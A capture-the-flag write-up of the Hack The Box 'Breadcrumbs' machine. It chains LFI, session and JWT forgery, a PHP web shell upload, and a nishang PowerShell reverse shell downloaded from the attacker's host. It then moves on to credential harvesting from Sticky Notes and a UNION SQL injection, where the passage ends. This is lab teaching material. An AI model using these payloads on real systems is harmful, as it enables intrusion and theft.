<p align="center"><img src="src/banner.png" alt="Banner"></img></p>
<p align="center">Creator: <a href="https://app.hackthebox.eu/profile/163104">helich0pper</a></p>

# Personal thoughts
Such a web machine! Directory traversal (LFI), PHP session, JWT. On the other hand; Reversing and SQLi. The most instructive box I solved so far, thanks [@helich0pper](https://github.com/helich0pper)! The most I tried to explain the steps as simple as I can. Hope you'll find it useful; if so, consider [suporting](https://www.buymeacoffee.com/f4T1H21) a student to get `OSCP` exam and __+respecting my profile in HTB__.

<a href="https://app.hackthebox.eu/profile/184235">
  <img src="https://www.hackthebox.eu/badge/image/184235" alt="f4T1H">
  </img>
</a>
<br>
<a href="https://www.buymeacoffee.com/f4T1H21">
  <img src="https://github.com/f4T1H21/f4T1H21/blob/main/support.png" width="221" height="40" alt="Support">
  </img>
</a>
<br><br>
Now, let me get right into it.

---

#### Installed packages in this writeup
- nishang
- rlwrap
- ghidra

# Reconnaissace

As always, we start the initial enumeration and recon with `nmap`.

```bash
nmap -sS -sC -sV -T4 -O -p- 10.10.10.228
```
```bash
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-16T05:43:53
|_  start_date: N/A
```

So we have `22/ssh` in a windows box, which is unusual. Except that, we have `80/http` (+ `https`), and `445/smb`.<br>

Let's first start enumerating with the smb service running on port `445`.

## 445/smb

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> smbmap -H 10.10.10.228 -p " "       
[!] Authentication error on 10.10.10.228
```

Nope, it doesn't allow us to login without credentials.

Let's move forward and continue enumerating process on port `80/http`.

## 80/http

![](src/initialweb.png)

As we can see here is a website with a button which redirects to a file called `books.php`. Let's follow the button and have a look at that file too.

![](src/booksphp.png)

I tried to make it give errors by trying some basic SQLi. But couldn't get anything. After looking at DOM from browser's inspector, I a source file in `js/books.js`

![](src/booksjs.png)

Realized a difference between the request functions. Their `method` parameter's value is not same!

- So we have the value `1` for the `method` param in `getInfo` function.
- And we have the value `0` for the `method` param in `searchBooks` function.

Let's try doing the job of these functions manually by sending `POST` requests to `/books/bookController.php` file manually with `cURL`.

We first try the `searchBooks` function. I also noticed that the response is a JSON data so used `jq` to parse and beautify it.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl -s \
        -X POST http://10.10.10.228/includes/bookController.php \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" \
        -H "Connection: keep-alive" \
        -H "X-Requested-With: XMLHttpRequest" \
        -d "title=a&author=a&method=0" \
        | jq .
[
  {
    "id": 3,
    "title": "Adventures of Tom Sawyer",
    "author": "Mark Twain"
  },
  {
    "id": 7,
    "title": "Animal Farm",
    "author": "George Orwell"
  },
  {
    "id": 8,
    "title": "Ben Hur",
    "author": "Lewis Wallace\t"
  },
  {
    "id": 9,
    "title": "Baburnama",
    "author": "Babur"
  },
  {
    "id": 10,
    "title": "Arthashastra",
    "author": "Kautilya"
  },
  {
    "id": 11,
    "title": "Anand Math",
    "author": "Bankimchandra Chattopadhyay\t"
  },
  {
    "id": 12,
    "title": "Alice's Adventures in Wonderland",
    "author": " Lewis Carrol"
  },
  {
    "id": 14,
    "title": "Pride and Prejudice",
    "author": "Jane Austen"
  }
]

```

As a test, we first set `title` and `author` param as `a`.<br>
And we got some result. I think it searches the titles and authors that contains the value we give and prints them out.

## LFI

Let's try other function and see what we get.<br>
Again we give the value `a` to the param for a test.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl -s \
        -X POST http://10.10.10.228/includes/bookController.php \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" \
        -H "Connection: keep-alive" \
        -H "X-Requested-With: XMLHttpRequest" \
        -d "book=a&method=1"
<br />
<b>Warning</b>:  file_get_contents(../books/a): Failed to open stream: No such file or directory in <b>C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
false
```

Nice!! This time we got an error, did you see the function?

```php
file_get_contents(../books/a)
```

Rather than using a DB to get the contents, it just reads the files located at the `books` directory in the web server.<br>
And this thing I think can be lead to LFI (Local File Inclusion)!

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl -s \
        -X POST http://10.10.10.228/includes/bookController.php \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" \
        -H "Connection: keep-alive" \
        -H "X-Requested-With: XMLHttpRequest" \
        -d "book=../index.php&method=1"  
"<?php session_start();\r\n?>\r\n<html lang=\"en\">\r\n    <head>\r\n        <title>Library<\/title>\r\n        <meta charset=\"utf-8\">\r\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n        <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm\" crossorigin=\"anonymous\">\r\n        <script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js\"><\/script>\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"css\/main.css\">\r\n        <link rel=\"stylesheet\" type=\"text\/css\" href=\"css\/all.css\">\r\n    <\/head>\r\n\r\n    <nav class=\"navbar navbar-default justify-content-end\">\r\n        <div class=\"navbar-header justify-content-end\">\r\n            <button type=\"button\" class=\"navbar-toggle btn btn-outline-info p-3 m-3\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"><i class=\"fas fa-hamburger\"><\/i><\/button>\r\n        <\/div>\r\n\r\n        <div class=\"collapse navbar-collapse justify-content-end mr-5\">\r\n             <ul class=\"navbar-nav\">\r\n                <li class=\"nav-item\"><a class=\"nav-link text-right\" href=\"#\"><i class=\"fas fa-home\"><\/i> Home<\/a><\/li>\r\n            <\/ul> \r\n        <\/div>\r\n    <\/nav>\r\n    <body class=\"bg-dark text-white\">\r\n        <main class=\"container-fluid\">\r\n            <div class=\"container-fluid bg-dark text-center pt-5\" id=\"start\">\r\n                <div class=\"container-fluid\">\r\n                    <h1 id=\"main-title\">Library<\/h1>\r\n                    <hr style=\"background-color:white;\" class=\"w-50 mb-5\">\r\n                <\/div>\r\n                <div class=\"container-fluid pt-5\">\r\n                    <a class=\"btn-outline-orange\" href=\"php\/books.php\">Check books.<\/a>\r\n                <\/div>\r\n            <\/div>\r\n        <\/main>\r\n        <?php include \"includes\/footer.php\";?>\r\n    <script src=\"https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@4.5.3\/dist\/js\/bootstrap.bundle.min.js\" integrity=\"sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ\/JpcUGGOn+Y7RsweNrtN\/tE3MoK7ZeZDyx\" crossorigin=\"anonymous\"><\/script>\r\n    <script type=\"text\/javascript\" src='js\/main.js'><\/script>\r\n    <\/body>\r\n\r\n\r\n<\/html>\r\n"
```

![](/src/gifs/bingobango.gif)

But this content is gibberish, let's beautify it.

Here is a 5-line python script to do that job.

__lfi.py__

```python
import requests, sys
file = "../" + sys.argv[1]
data = {'book': file, 'method': '1'}
r = requests.post('http://10.10.10.228/includes/bookController.php', data=data)
print(bytes(r.text, 'utf-8').decode('unicode_escape').strip('"').replace('\/','/'))
```

Let's fuzz the web and try to read contents of the files we encounter.

### Gobuster

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> gobuster -q dir -u http://10.10.10.228/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x .txt,.php,.aspx,.asp,.html,.xhtml -e -r -b 404,403
http://10.10.10.228/includes             (Status: 200) [Size: 1206]
http://10.10.10.228/index.php            (Status: 200) [Size: 2368]
http://10.10.10.228/js                   (Status: 200) [Size: 1187]
http://10.10.10.228/css                  (Status: 200) [Size: 1183]
http://10.10.10.228/db                   (Status: 200) [Size: 971] 
http://10.10.10.228/php                  (Status: 200) [Size: 976] 
http://10.10.10.228/.                    (Status: 200) [Size: 2368]
http://10.10.10.228/portal               (Status: 200) [Size: 2508]
http://10.10.10.228/books                (Status: 200) [Size: 2462]
http://10.10.10.228/examples             (Status: 503) [Size: 401]
```

We see a directory (?) named `portal`, let's scan it too and see if we get valuables.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> gobuster -q dir -u http://10.10.10.228/portal -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x .txt,.php,.aspx,.asp,.html,.xhtml -e -r -b 404,403
http://10.10.10.228/portal/includes             (Status: 200) [Size: 1668]
http://10.10.10.228/portal/login.php            (Status: 200) [Size: 2508]
http://10.10.10.228/portal/index.php            (Status: 200) [Size: 2508]
http://10.10.10.228/portal/logout.php           (Status: 200) [Size: 2508]
http://10.10.10.228/portal/uploads              (Status: 200) [Size: 795] 
http://10.10.10.228/portal/assets               (Status: 200) [Size: 1418]
http://10.10.10.228/portal/db                   (Status: 200) [Size: 992] 
http://10.10.10.228/portal/php                  (Status: 200) [Size: 1629]
http://10.10.10.228/portal/signup.php           (Status: 200) [Size: 2735]
http://10.10.10.228/portal/.                    (Status: 200) [Size: 2508]
http://10.10.10.228/portal/vendor               (Status: 200) [Size: 1861]
http://10.10.10.228/portal/cookie.php           (Status: 200) [Size: 0]
```

We got some files here. Let's start reading their contents one by one.

Btw we noticed the directory indexing in `/includes/`, `/js/`, `/php/` and `/db/` directories.<br>
Here the initial idea of mine was to look at the file we `POST` request to get an LFI.

```php
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> python3 lfi.py includes/bookController.php 
/root/hackthebox/breadcrumbs/lfi.py:5: DeprecationWarning: invalid escape sequence '\/'
  print(bytes(r.text, 'utf-8').decode('unicode_escape').strip('"').replace('\/','/'))
<?php

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $out = "";
    require '../db/db.php';

    $title = "";
    $author = "";

    if($_POST['method'] == 0){
        if($_POST['title'] != ""){
            $title = "%".$_POST['title']."%";
        }
        if($_POST['author'] != ""){
            $author = "%".$_POST['author']."%";
        }
        
    
        $query = "SELECT * FROM books WHERE title LIKE ? OR author LIKE ?";
        $stmt = $con->prepare($query);
        $stmt->bind_param('ss', $title, $author);
        $stmt->execute();
        $res = $stmt->get_result();
        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
    }

    elseif($_POST['method'] == 1){
        $out = file_get_contents('../books/'.$_POST['book']);
    }

    else{
        $out = false;
    }

    echo json_encode($out);
}
```

`require '../db/db.php';` took the attention of mine.

```php
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> python3 lfi.py db/db.php                  
<?php

$host="localhost";
$port=3306;
$user="bread";
$password="jUli901";
$dbname="bread";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
?>
```

Nice, we got some creds of the user `bread`.

- `bread:jUli901`

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> mysql -h 10.10.10.228 -p 3306 -D bread -u bread -p'jUli901'
ERROR 1130 (HY000): Host '10.10.14.48' is not allowed to connect to this MariaDB server
```

No luck. If you remember, we saw that error on our nmap result too.

While looking at the contents of the other files, I noticed some interesting things in `portal/includes/fileController.php`

__fileController.php__
```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> python3 lfi.py portal/includes/fileController.php
/root/hackthebox/breadcrumbs/lfi.py:5: DeprecationWarning: invalid escape sequence '\/'
  print(bytes(r.text, 'utf-8').decode('unicode_escape').strip('"').replace('\/','/'))
<?php
$ret = "";
require "../vendor/autoload.php";
use \Firebase\JWT\JWT;
session_start();

function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '../uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
            $ret = "Success. Have a great weekend!";
        }     
        else{
            $ret = "Missing file or title :(" ;
        }
    }
    else{
        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }

    echo $ret;
}
```

JWT? What about that privileged admin `paul`?

I think we missed some web pages about authentication.

![](src/portal.png)

Yes, let's try to create an account.


# Foothold: [PHP Session](#php-session), [JWT](#jwt), [File Upload](#file-upload)

![](src/dashboard.png)

We find the page what the file we found checks.<br>
We have two cookies, a`PHP Session` and a `JWT` (Json Web Token).<br>
And we got the `JWT` secret from the file `booksController.php` as you remember.

The only thing missing is the method of the `PHP Session`'s generation.<br>
Then we're ready to upload a file as `paul`.

## PHP Session

And enumerating more gives us the necessary file: `/portal/cookie.php`

__cookie.php__
```php
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
?>
```
Let me explain what this code does.

- It takes a username.
- Calculates the number of the letters in the username.
- Assigns a variable from `0` to username's strlen -1 randomly.
- Generates a key with static parts in it.
- md5 crypts the key and puts the username in front of it.

So the scenario of us is: 

We have the admin named `paul` so it has 4 letters. If we substract `1`, we have `3`, and the `$seed` variable is a random number from `0` to `3`.
The only thing here is to try all possible values for the `$seed` variable with a simple for loop.

I modified the code to do that job:

```php
<?php
function makesession($username, $seed){
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}

for ($x = 0; $x <= 3; $x++) {
    print makesession('paul', $x);
    echo "\n";
}
?>
```

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> php -f cookie.php
paula2a6a014d3bee04d7df8d5837d62e8c5
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paul47200b180ccd6835d25d034eeb6e6390
```

These are the possible Session IDs for `paul`.

## JWT

Now time to find out the correct JWT token.<br>
Copy the token from `Cookie-Editor` and decode it.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> jq -R 'split(".") | .[0],.[1] | @base64d | fromjson' <<< eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiZjRUMUgifX0.LS26Z_zznu-oIvL5zp-gLLTcKNS61YhThLEoEBMo5tI
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "data": {
    "username": "f4T1H"
  }
}
```

Change the values and put our encoded secret at the end using [this](https://jwt.io) site.

![](src/jwt.png)

Now time to become `paul`, let's go'n change our `PHP Session` and `JWT`.

![](src/paul.png)

## File upload

We go and upload a malicious web shell from `File management` section.<br>
When I tried `system()` function to get a webshell, I failed. But `shell_exec` function is working properly.

__f4T1H.php__

```php
<?php print shell_exec($_GET['f4T1H']);?>
```

Before pressing `Upload`, make sure you intercept the requests on Burp.

Now change the extension and filename as seen below.

![](src/burp.png)

Then forward the request.<br>
Now we finally have a command execution on the remote host.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl 'http://10.10.10.228/portal/uploads/f4T1H.php?f4T1H=whoami'
breadcrumbs\www-data
```

Now, let's get a more beautiful shell.

__Attention:__ Install `nishang` and `rlwrap` packages if you don't have.

We'll get a powershell reverse shell using `nishang`'s payload and use rlwrap to make our shell more useful.

Here we can't use the payload without replacing some strings in it. AV might be blocking. So first of all we make some changes in the file.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./f4T1H.ps1                   
                                                                                                                     
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> echo '\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 2121' >> f4T1H.ps1
                                                                                                                     
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> sed -i 's/Invoke-PowerShellTcp/f4T1H/g' f4T1H.ps1
```

Now we're ready to go. Fire up the following powershell code to make remote host download our reverse shell.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl "http://10.10.10.228/portal/uploads/f4T1H.php?f4T1H=powershell+IEX(New-Object+Net.WebClient).downloadString('http://10.10.14.8/f4T1H.ps1')"
```

![](src/shell.png)

# Lateral Movement: [SQLite DB](#sqlite-db)

```powershell
dir


    Directory: C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        11/28/2020   1:48 AM            170 alex.disabled                                                        
-a----        11/28/2020   1:48 AM            170 emma.disabled                                                        
-a----        11/28/2020   1:48 AM            170 jack.disabled                                                        
-a----        11/28/2020   1:48 AM            170 john.disabled                                                        
-a----         1/17/2021   3:11 PM            192 juliette.json                                                        
-a----        11/28/2020   1:48 AM            170 lucas.disabled                                                       
-a----        11/28/2020   1:48 AM            170 olivia.disabled                                                      
-a----        11/28/2020   1:48 AM            170 paul.disabled                                                        
-a----        11/28/2020   1:48 AM            170 sirine.disabled                                                      
-a----        11/28/2020   1:48 AM            170 william.disabled                                                     


type juliette.json
{
	"pizza" : "margherita",
	"size" : "large",	
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}
PS C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>
```

We got the user `juliette`'s credentials in the web application directory.

After `ssh`ing, you can see there's another user named `development` in remote host.

```powershell
juliette@BREADCRUMBS C:\Users\juliette>net user

User accounts for \\BREADCRUMBS

-------------------------------------------------------------------------------
Administrator            DefaultAccount           development
Guest                    juliette                 sshd
WDAGUtilityAccount       www-data
The command completed successfully.
```

We find a todo file in `%HOMEDRIVE%%HOMEPATH%\Desktop\`.

```html
<html>
<style>
html{
background:black;
color:orange;    
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```

There's a 'Microsoft Store Sticky Notes' application which stores passwords in plain text format.

I couldn't find the application directory inside the default path mentioned on internet, but found the backup directory of it!

![](src/location.png)

And we find a sqlite file.

```powershell
PS C:\Users\juliette> cd ~\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe> gci -recurse


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/15/2021   4:08 PM                AC
d-----         1/15/2021   4:08 PM                AppData
d-----         1/15/2021   4:08 PM                LocalCache
d-----         1/15/2021   4:10 PM                LocalState
d-----         1/15/2021   4:08 PM                RoamingState
d-----         1/15/2021   4:08 PM                Settings
d-----         1/15/2021   4:08 PM                SystemAppData
d-----         1/15/2021   4:08 PM                TempState


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\AC


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/15/2021   4:08 PM                Temp


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\Settings


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:08 PM              0 roaming.lock
-a----         1/15/2021   4:10 PM           8192 settings.dat


PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe>
```

Let's transfer the file in our localhost and have a look at it in detail.

Because we know user's ssh credentials, we can use `scp` (secure copy).

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> scp -r juliette@10.10.10.228:$(echo -E "C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState" | tr \\ "/") .
tr: warning: an unescaped backslash at end of string is not portable
juliette@10.10.10.228's password: 
15cbbc93e90a4d56bf8d9a29305b8981.storage.session                                                                                                                                                            100%   20KB 110.7KB/s   00:00    
plum.sqlite                                                                                                                                                                                                 100% 4096    41.4KB/s   00:00    
plum.sqlite-shm                                                                                                                                                                                             100%   32KB 239.4KB/s   00:00    
plum.sqlite-wal
```

## SQLite DB

```sql
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs/LocalState]
└─> sqlite3 plum.sqlite 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
Media           Stroke          SyncState       User          
Note            StrokeMetadata  UpgradedNote  
sqlite> select count(*) from Media;
0
sqlite> select count(*) from Stroke;
0
sqlite> select count(*) from SyncState;
0
sqlite> select count(*) from User;
1
sqlite> select * from User;
|8e814e57-9d28-4288-961c-31c806338c5b|8e814e57-9d28-4288-961c-31c806338c5b|637422450113001719||637422450113001719
sqlite> select count(*) from Note;
1
sqlite> select * from Note;
\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122
sqlite> select count(*) from StrokeMetadata;
0
sqlite> select count(*) from UpgradedNote;
0
sqlite> .quit
```

Now we got some credentials from filled tables. We've already known the credentials of user `juliette`, but `development` is a new user for us.

- `development:fN3)sN5Ee@g`

# PE: [Reversing an Executable](#reversing) & [SQLi](#sqli)

Now we have the privilege for directory `C:\Development`.<br>
We transfer the file to our localhost using `impacket-smbserver`.

```bash
mkdir smbdir
impacket-smbserver smbshare smbdir -smb2support
```
```powershell
copy .\Krypter_Linux \\10.10.14.8\\smbshare
```
![](src/transfer.png)

# Reversing

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs/smbdir]
└─> file Krypter_Linux 
Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                                                                              
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs/smbdir]
└─> ./Krypter_Linux                  
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
	- Windows version with GUI support
	- Get password from cloud and AUTOMATICALLY decrypt!
***

No key supplied.
USAGE:

Krypter <key>
```

Let's decompile the file using `ghidra`.

![](src/decompile.png)

Here we can see in the main function that there's a curl request to `http://passmanager.htb:1234/index.php`. But we can't connect to port 1234 remotely.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> nc -zv 10.10.10.228 1234
10.10.10.228: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.228] 1234 (?) : Connection refused
```

Let's port forward using `ssh`.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs/LocalState]
└─> ssh -NL 1234:127.0.0.1:1234 development@10.10.10.228
development@10.10.10.228's password: 

```

Now we add `passmanager.htb` to our `/etc/hosts` file attached to our loopback (127.0.0.1).

Okay, we're good to go with connection. Let's move forward and read the code in detail.

So; if we don't provide a value that equals to `0x641` and the program is not stopped running, it prints the output `Incorrect master key`.

Here the thing is that we can convert this hex's value to decimal and provide the equivalent ascii string.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs/smbdir]
└─> echo "The decimal equivalent of '0x641' is: '$((16#641))'" 
The decimal equivalent of '0x641' is: '1601'
```

```bash
man ascii
```

```
| Ascii | Decimal |
|   }   |   125   |
|   e   |   101   | 
|-------*---------|
| }*12  =  1500   |
|}*12+e =  1601   |
```

We give the key as seen below and we get such a nice output!

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs/smbdir]
└─> ./Krypter_Linux '}}}}}}}}}}}}e' 
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
	- Windows version with GUI support
	- Get password from cloud and AUTOMATICALLY decrypt!
***

Requesting decryption key from cloud...
Account: Administrator
Server response:


selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```

Let's now do that manually using curl.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl http://passmanager.htb:1234/index.php -d "method=select&username=administrator&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```

Yeah, it definitely works!

## SQLi

Let's try some basic SQLi here.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl 'http://passmanager.htb:1234/index.php' -d "method=select&username=administ'union select 'SQLi works fine xD'-- -rator&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(18) "SQLi works fine xD"
  }
}
```
We'll use [`information_schema`](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html) to dive into database.

We first look at the databases using `information_schema`'s `schemata` table.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl 'http://passmanager.htb:1234/index.php' -d "method=select&username=administ'union select schema_name from information_schema.schemata-- -rator&table=passwords"
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(18) "information_schema"
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(5) "bread"
  }
}
```

Then we use `tables` table to see the tables who don't belong to `information_schema` database.

```bash
┌──(root💀f4T1H)-[~/hackthebox/breadcrumbs]
└─> curl 'http://passmanager.htb:1234/index.php' -d "method=select&username=administ'union select table_name from information_schema.tables where not table_schema='information_schema'-- -rator&table=passwords"
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(9) "passwords"
  }
}
```

